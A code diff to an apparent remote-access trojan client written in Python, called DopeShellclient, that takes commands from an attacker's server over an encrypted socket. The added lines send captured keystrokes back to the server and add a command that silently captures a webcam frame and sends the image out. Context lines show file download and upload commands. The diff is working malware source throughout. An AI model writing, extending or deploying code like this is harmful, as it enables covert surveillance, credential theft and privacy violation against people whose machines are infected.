@@ -5,6 +5,7 @@ import os
 import getpass
 import platform
 import sys
+import cv2
 import io
 import pynput.keyboard 
 import threading
@@ -23,6 +24,9 @@ class DopeShellclient:
         self.server_ip = server_ip
         self.server_port = server_port
         self.key = key
+        self.keylog = []
+        self.keylogger_thread = None
+        self.is_keylogger_running = False
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def send_data(self, data):
@@ -103,16 +107,18 @@ class DopeShellclient:
 
     # Method to stop keylogger and return logs
     def stop_keylogger(self):
+        print('running stop keylogger function')
         self.is_keylogger_running = False
         if self.keylogger_thread:
-            self.keylogger_thread.join()
-
-        log_file_path = "keylogs.txt"
-        with open(log_file_path, "w") as f:
-            f.write("".join(self.keylog))
-
+            print('trying to stop thread')
+            self.keylogger_thread.join(timeout=5)
+        print('closed thread')
         # Send keylogs back to server
-        self.send_data(log_file_path)
+        print('sending keylogs to server')
+        finalOutput = ' '.join(self.keylog) 
+
+        self.send_data(finalOutput)
+        print('sent keylogs to server')
 
         # Clear keylogs
         self.keylog = []
@@ -217,9 +223,12 @@ class DopeShellclient:
             elif command == "keylogger_start":
                 print("calling keylogger_start function")
                 response = self.start_keylogger()
+                self.send_data(response)
 
             elif command == "keylogger_stop":
                 response = self.stop_keylogger()
+                print('ran keylogger stop function')
+                # self.send_data(response)
 
             elif command.lower().startswith('download'):
                 _, file_path = command.split()
@@ -243,6 +252,23 @@ class DopeShellclient:
                             break
                         f.write(file_data)
                 self.sock.send(self.encrypt(b"[+] File upload complete."))
+
+            elif command.lower().startswith('capture_webcam'):
+                cap = cv2.VideoCapture(0)
+                ret, frame = cap.read()
+                cap.release()
+                if ret:
+                    # Convert the image to bytes without saving it to a file
+                    ret, buffer = cv2.imencode('.jpg', frame)
+                    if ret:
+                        image_bytes = buffer.tobytes()
+                        print(type(image_bytes))
+                        # print(image_bytes[:100])  # Print the first 100 bytes for verification
+                        self.send_data(image_bytes)
+                    else:
+                        return "[-] Error encoding the image."
+                else:
+                    return "[-] Error capturing webcam image."
 
             elif command.lower().startswith('mkdir'):
                 _, directory = command.split(' ', 1)
